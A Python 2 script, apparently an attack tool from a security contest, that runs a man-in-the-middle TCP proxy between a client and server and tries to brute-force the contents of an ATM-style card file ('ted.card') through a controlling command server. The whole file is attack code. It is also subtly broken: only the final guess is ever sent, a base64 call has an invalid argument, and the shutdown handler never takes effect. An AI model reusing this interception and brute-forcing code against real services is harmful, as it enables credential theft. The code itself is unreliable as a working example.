
#!/usr/bin/env python2
import traceback
import random
import socket
import argparse
import threading
import signal
import sys
import itertools
import string
from contextlib import contextmanager
import json
import requests
import time
import base64

running = True
verbose = True

CLIENT2SERVER = 1
SERVER2CLIENT = 2

def mitm(buff, direction):
  hb = buff
  if direction == CLIENT2SERVER:
    pass
  elif direction == SERVER2CLIENT:
    pass
  return hb

@contextmanager
def ignored(*exceptions):
  try:
    yield
  except exceptions:
    pass 

def killpn( a, b, n):
  if n != CLIENT2SERVER:
    killp( a, b)

def killp(a, b):
  with ignored(Exception):
    a.shutdown(socket.SHUT_RDWR)
    a.close()
    b.shutdown(socket.SHUT_RDWR)
    b.close()
  return
def connectToServer(host, port, message):
  r = requests.post("http://" + host + ":" + str(port),
    data = str(message))
  return r.text

def worker(client, server, n):
  while running == True:
    b = ""
    with ignored(Exception):
      b = client.recv(1024)
    if len(b) == 0:
      killpn(client,server,n)
      return
    try:
      b = mitm(b,n)
    except:
      pass
    try:
      if b != None:
        server.send(b)
    except:
      killpn(client,server,n)
      return
  killp(client,server)
  return

def signalhandler(sn, sf):
  running = False

def doProxyMain(port, remotehost, remoteport):
  signal.signal(signal.SIGTERM, signalhandler)
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    workers = []
    while running == True:
      k,a = s.accept()
      v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      v.connect((remotehost, remoteport))
      t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER))
      t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT))
      t2.start()
      t1.start()
      workers.append((t1,t2,k,v))
      try:
        for guess in itertools.product(chars, repeat=5):
          guess = ''.join(guess)
          req = {"REQUEST": { "type":"card_contents",
          "cardfile": "ted.card","content": base64.b64encode(str(guess), 'utf-8')
          }}
        result = connectToServer(args.c, args.d, req)
      except:
          pass
      finally:
          connectToServer(args.c, args.d, {"REQUEST": {"type":"done"}})
          
  except KeyboardInterrupt:
    signalhandler(None, None)
  for t1,t2,k,v in workers:
    killp(k,v)
    t1.join()
    t2.join()
  return


if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Proxy')
  parser.add_argument('-p', type=int, default=4000, help="listen port")
  parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
  parser.add_argument('-q', type=int, default=3000, help="server port")
  parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
  parser.add_argument('-d', type=int, default=5000, help="command port")
  args = parser.parse_args()
  print('started\n')
  sys.stdout.flush()
  chars = string.ascii_uppercase + string.digits
 
  doProxyMain(args.p, args.s, args.q)
